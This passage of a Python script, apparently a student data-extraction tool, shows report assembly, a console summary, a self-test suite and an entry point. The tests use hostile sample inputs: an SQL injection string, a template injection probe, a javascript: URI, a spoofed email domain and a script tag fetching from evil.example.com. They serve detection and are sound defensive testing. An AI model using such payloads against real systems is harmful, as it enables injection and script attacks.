    Inventory tag-shaped tokens. See the caveat on HTML_TAG_RE: this does not
    parse or sanitise HTML, and must never be used to do so.
    """
    inventory, dangerous, counts = [], [], {}

    for match in HTML_TAG_RE.finditer(text):
        name = match.group("name").lower()
        counts[name] = counts.get(name, 0) + 1

        attrs = match.group("attrs") or ""
        risky = (
            name in DANGEROUS_TAGS
            or THREAT_SIGNATURES["xss_event_handler"].search(attrs) is not None
            or THREAT_SIGNATURES["unsafe_uri_scheme"].search(attrs) is not None
        )

        record = {
            "tag": name,
            "kind": "closing" if match.group("closing")
                    else "self-closing" if match.group("selfclose") else "opening",
            "has_attributes": bool(attrs.strip()),
        }

        if risky:
            # The dangerous tag's attributes are NOT reproduced — only the fact
            # of the finding and a hash, so this report is safe to open.
            dangerous.append({**record, "reason": "tag or attribute is an XSS vector",
                              "sha256_16": fingerprint(match.group(0))})
        else:
            inventory.append(record)

    return {
        "valid": inventory,
        "rejected": dangerous,
        "tag_frequency": dict(sorted(counts.items(), key=lambda kv: -kv[1])),
    }


def extract_hashtags(text: str) -> dict:
    valid, seen = [], set()
    for match in HASHTAG_RE.finditer(text):
        tag = match.group(0)
        if tag.lower() in seen:
            continue
        seen.add(tag.lower())
        valid.append({"value": tag, "text": match.group("tag")})
    return {"valid": valid, "rejected": []}


def extract_currency(text: str) -> dict:
    valid, seen = [], set()

    for match in CURRENCY_RE.finditer(text):
        raw = match.group(0).strip()
        if raw in seen:
            continue
        seen.add(raw)

        unit = match.group("pre") or match.group("post")
        amount = match.group("amount_pre") or match.group("amount_post")

        valid.append({
            "value": raw,
            "currency": unit,
            "amount": amount,
            # Stored as a STRING, never a float. Binary floating point cannot
            # represent 0.10 exactly, so money must never be held in a float.
            "amount_normalised": amount.replace(",", ""),
            "position": "prefix" if match.group("pre") else "suffix",
        })

    return {"valid": valid, "rejected": []}


# =============================================================================
# SECTION 8 — REPORT ASSEMBLY
# =============================================================================

def build_report(raw_text: str, source_name: str) -> dict:
    clean_text, sanitisation_notes = sanitise_input(raw_text)
    threats = scan_for_threats(clean_text)

    # Hostile regions are computed BEFORE extraction so that every extractor
    # can refuse to harvest data out of an attack payload.
    hostile = threat_spans(clean_text)

    cards, claimed_spans = extract_credit_cards(clean_text)
    emails = extract_emails(clean_text, hostile)
    phones = extract_phones(clean_text, claimed_spans + hostile)
    urls = extract_urls(clean_text, hostile)
    times = extract_times(clean_text)
    html_tags = extract_html_tags(clean_text)
    hashtags = extract_hashtags(clean_text)
    currency = extract_currency(clean_text)

    extracted = {
        "emails": emails,
        "urls": urls,
        "phone_numbers": phones,
        "credit_cards": cards,
        "times": times,
        "html_tags": html_tags,
        "hashtags": hashtags,
        "currency_amounts": currency,
    }

    threat_summary: dict[str, int] = {}
    for finding in threats:
        threat_summary[finding["signature"]] = threat_summary.get(finding["signature"], 0) + 1

    return {
        "metadata": {
            "source_file": source_name,
            "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "characters_scanned": len(clean_text),
            "lines_scanned": clean_text.count("\n") + 1,
            "generator": "alu-regex-data-extraction v1.0",
        },
        "security": {
            "input_trusted": False,
            "sanitisation_notes": sanitisation_notes,
            "threats_detected": len(threats),
            "threat_summary": threat_summary,
            "threat_findings": threats,
            "redaction_policy": {
                "emails": "local part masked after 2 characters; domain retained",
                "credit_cards": "last 4 digits only (stricter than PCI-DSS allows)",
                "phone_numbers": "middle digits masked",
                "hostile_payloads": "never stored raw; SHA-256 fingerprint only",
            },
        },
        "summary": {
            name: {
                "valid": len(bucket.get("valid", [])),
                "rejected": len(bucket.get("rejected", [])),
            }
            for name, bucket in extracted.items()
        },
        "alu_validation": {
            "official_alueducation_com": len(emails["alu_official"]),
            "alumni_alueducation_com": len(emails["alu_alumni"]),
            "si_alueducation_com": len(emails["alu_si"]),
            "total_alu_addresses": len(emails["alu_official"])
                                   + len(emails["alu_alumni"])
                                   + len(emails["alu_si"]),
        },
        "extracted": extracted,
    }


def print_summary(report: dict) -> None:
    """Human-readable console summary. Prints only redacted values."""
    meta = report["metadata"]
    print("=" * 70)
    print(" ALU REGEX DATA EXTRACTION — RUN SUMMARY")
    print("=" * 70)
    print(f" source      : {meta['source_file']}")
    print(f" scanned     : {meta['characters_scanned']:,} chars / {meta['lines_scanned']:,} lines")
    print(f" generated   : {meta['generated_at']}")
    print()

    print(" EXTRACTION RESULTS")
    print(" " + "-" * 68)
    print(f" {'category':<20}{'valid':>10}{'rejected':>12}")
    print(" " + "-" * 68)
    for name, counts in report["summary"].items():
        print(f" {name:<20}{counts['valid']:>10}{counts['rejected']:>12}")
    print()

    alu = report["alu_validation"]
    print(" ALU EMAIL VALIDATION")
    print(" " + "-" * 68)
    print(f"   @alueducation.com          : {alu['official_alueducation_com']}")
    print(f"   @alumni.alueducation.com   : {alu['alumni_alueducation_com']}")
    print(f"   @si.alueducation.com       : {alu['si_alueducation_com']}")
    print()

    security = report["security"]
    print(" SECURITY")
    print(" " + "-" * 68)
    print(f"   input treated as trusted   : {security['input_trusted']}")
    print(f"   hostile patterns rejected  : {security['threats_detected']}")
    for signature, count in sorted(security["threat_summary"].items(), key=lambda kv: -kv[1]):
        print(f"     - {signature:<28} x{count}")
    for note in security["sanitisation_notes"]:
        print(f"   [{note['severity']}] {note['type']}")
    print()

    cards = report["extracted"]["credit_cards"]
    if cards["valid"]:
        print(" CARDS ACCEPTED (masked — full numbers are never stored)")
        print(" " + "-" * 68)
        for card in cards["valid"]:
            print(f"   {card['masked']:<24}{card['brand']}")
    if cards["rejected"]:
        print(" CARDS REJECTED")
        print(" " + "-" * 68)
        for card in cards["rejected"]:
            print(f"   {card['masked']:<24}{card['reason']}")
    print("=" * 70)


# =============================================================================
# SECTION 9 — SELF-TEST SUITE
# =============================================================================
# Runnable proof that the edge cases in the input file behave as claimed.
# -----------------------------------------------------------------------------

SELF_TESTS = [
    # (label, callable, expected)
    ("ALU official accepted",
     lambda: classify_alu_email("a.uwase@alueducation.com"), "alu_official"),
    ("ALU alumni accepted",
     lambda: classify_alu_email("jp.n@alumni.alueducation.com"), "alu_alumni"),
    ("ALU SI accepted",
     lambda: classify_alu_email("ops.desk@si.alueducation.com"), "alu_si"),
    ("domain-suffix attack rejected",
     lambda: classify_alu_email("k@alueducation.com.attacker.net"), None),
    ("one-letter-short alumni TLD rejected",
     lambda: classify_alu_email("jp@alumni.alueducation.co"), None),
    ("prefix attack rejected",
     lambda: classify_alu_email("evil.com/x?@alueducation.com"), None),
    ("Visa test number passes Luhn",
     lambda: luhn_check("4111111111111111"), True),
    ("mutated Visa fails Luhn",
     lambda: luhn_check("4111111111111112"), False),
    ("Amex test number passes Luhn",
     lambda: luhn_check("378282246310005"), True),
    ("Amex brand identified",
     lambda: identify_card_brand("378282246310005"), "American Express"),
    ("22-digit blob yields no card",
     lambda: len(extract_credit_cards("4111111111111111111111")[0]["valid"]), 0),
    ("22-digit blob is reported, not silently dropped",
     lambda: extract_credit_cards("4111111111111111111111")[0]["rejected"][0]["reason"],
     "length 22 outside the valid 13-19 range"),
    ("plain prose dashes are not SQL injection",
     lambda: len(scan_for_threats("--- SECTION 2: RAW LOG LINES ---")), 0),
    ("doubled dot in local part rejected",
     lambda: validate_email_structure("jane..doe@example.com")[0], False),
    ("hex colour is not a hashtag",
     lambda: len(extract_hashtags("brand colour #FF5733 here")["valid"]), 0),
    ("real hashtag is found",
     lambda: extract_hashtags("ship it #Q1Close")["valid"][0]["text"], "Q1Close"),
    ("HTML entity is not a hashtag",
     lambda: len(extract_hashtags("&#39;quoted&#39;")["valid"]), 0),
    ("24:00 rejected as a time",
     lambda: len(extract_times("meeting at 24:00 sharp")["valid"]), 0),
    ("13:00 PM rejected as a time",
     lambda: len(extract_times("scheduled 13:00 PM")["valid"]), 0),
    ("12:00 AM normalises to 00:00",
     lambda: extract_times("12:00 AM")["valid"][0]["normalised_24h"], "00:00"),
    ("12:00 PM normalises to 12:00",
     lambda: extract_times("12:00 PM")["valid"][0]["normalised_24h"], "12:00"),
    ("javascript: URI is not extracted as a URL",
     lambda: len(extract_urls("javascript:void(0)")["valid"]), 0),
    ("javascript: URI is flagged as a threat",
     lambda: len(scan_for_threats("javascript:alert(1)")) > 0, True),
    ("SQL injection flagged",
     lambda: len(scan_for_threats("');DROP TABLE users;--")) > 0, True),
    ("template injection flagged",
     lambda: len(scan_for_threats("{{7*7}}")) > 0, True),
    ("card is not double-counted as a phone",
     lambda: len(extract_phones("card 4111 1111 1111 1111",
                                extract_credit_cards("card 4111 1111 1111 1111")[1])["valid"]), 0),
    ("Rwandan number extracted",
     lambda: extract_phones("call +250 788 214 663", [])["valid"][0]["region"], "RW"),
    ("trunk prefix (0) stripped from international form",
     lambda: extract_phones("+250 (0)788 214 663", [])["valid"][0]["digits"], 12),
    ("sentence period not absorbed into a 12-hour time",
     lambda: extract_times("escalated at 2:45 PM.")["valid"][0]["value"], "2:45 PM"),
    ("URL inside a script payload is quarantined",
     lambda: len(extract_urls("<script>fetch('https://evil.example.com/x')</script>",
                              threat_spans("<script>fetch('https://evil.example.com/x')</script>"))["valid"]), 0),
    ("card mask hides all but last four",
     lambda: mask_card("4111111111111111"), "************1111"),
    ("email mask hides the identity",
     lambda: mask_email("ange.uwase237@gmail.com"), "an***********@gmail.com"),
    ("suffix currency parsed",
     lambda: extract_currency("42.00 EUR")["valid"][0]["currency"], "EUR"),
    ("grouped RWF parsed",
     lambda: extract_currency("RWF 1,250,000")["valid"][0]["amount_normalised"], "1250000"),
]


def run_self_test() -> int:
    passed = failed = 0
    print("=" * 70)
    print(" SELF-TEST — edge cases and realistic variations")
    print("=" * 70)
    for label, function, expected in SELF_TESTS:
        try:
            actual = function()
            ok = actual == expected
        except Exception as error:                  # noqa: BLE001 - report, don't crash
            actual, ok = f"raised {type(error).__name__}", False
        if ok:
            passed += 1
            print(f"  PASS  {label}")
        else:
            failed += 1
            print(f"  FAIL  {label}  (expected {expected!r}, got {actual!r})")
    print("-" * 70)
    print(f"  {passed} passed, {failed} failed, {len(SELF_TESTS)} total")
    print("=" * 70)
    return 1 if failed else 0


# =============================================================================
# SECTION 10 — ENTRY POINT
# =============================================================================

def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Extract and validate structured data from untrusted raw text.")
    parser.add_argument("--input", default="input/raw-text.txt",
                        help="path to the raw text file (default: input/raw-text.txt)")
    parser.add_argument("--output", default="output/sample-output.json",
                        help="path for the JSON report (default: output/sample-output.json)")
    parser.add_argument("--self-test", action="store_true",
                        help="run the built-in edge-case suite and exit")
    parser.add_argument("--quiet", action="store_true",
                        help="write the JSON report without printing a summary")
    args = parser.parse_args(argv)

    if args.self_test:
        return run_self_test()

    # --- Safe file handling --------------------------------------------------
    # resolve() collapses any '..' segments, so a crafted --input value cannot
    # walk outside the project. The size is checked BEFORE reading, so an
    # oversized file is never loaded into memory.
    input_path = Path(args.input).resolve()
    if not input_path.is_file():
        print(f"error: input file not found: {input_path}", file=sys.stderr)
        return 2

    size = input_path.stat().st_size
    if size > MAX_INPUT_BYTES:
        print(f"error: input is {size:,} bytes, over the {MAX_INPUT_BYTES:,} byte limit",
              file=sys.stderr)
        return 2

    # errors="replace" means malformed bytes become U+FFFD instead of raising —
    # the program degrades gracefully rather than crashing on hostile encoding.
    raw_text = input_path.read_text(encoding="utf-8", errors="replace")

    report = build_report(raw_text, input_path.name)

    output_path = Path(args.output).resolve()
    output_path.parent.mkdir(parents=True, exist_ok=True)
    # json.dump escapes its own output, so no extracted value can break the
    # structure of the file — the JSON writer is the encoder, not string
    # concatenation. ensure_ascii=False keeps € and ¥ readable.
    with output_path.open("w", encoding="utf-8") as handle:
        json.dump(report, handle, indent=2, ensure_ascii=False)

    if not args.quiet:
        print_summary(report)
        print(f"\n JSON report written to: {output_path}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())

